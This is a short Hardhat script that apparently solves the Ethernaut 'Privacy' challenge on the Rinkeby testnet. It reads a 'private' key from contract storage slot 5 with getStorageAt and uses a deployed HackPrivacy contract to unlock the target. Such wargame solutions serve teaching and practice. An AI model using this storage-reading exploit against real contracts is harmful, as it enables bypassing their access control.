
const main = async () => {
  const privacyFactory = await ethers.getContractFactory('Privacy');
  const privacy = await privacyFactory.attach(
    '0xF84C6d31fde488Cc1bAb881c5108386a0F9D1CA1'
  );
  const hackFactory = await ethers.getContractFactory('HackPrivacy');
  const hack = await hackFactory.deploy(privacy.address);
  await hack.deployed();
  console.log('Deployed hack');
  const network = 'rinkeby';
  const provider = ethers.getDefaultProvider(network, {
    alchemy: process.env.RINKEBY_URL,
  });
  const key = await provider.getStorageAt(privacy.address, 5);
  console.log(`key: ${key}`);
  var txn = await hack.unlock(key);
  await txn.wait();
  console.log('Unlocked');
  txn = await privacy.locked();
  console.log(txn);
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
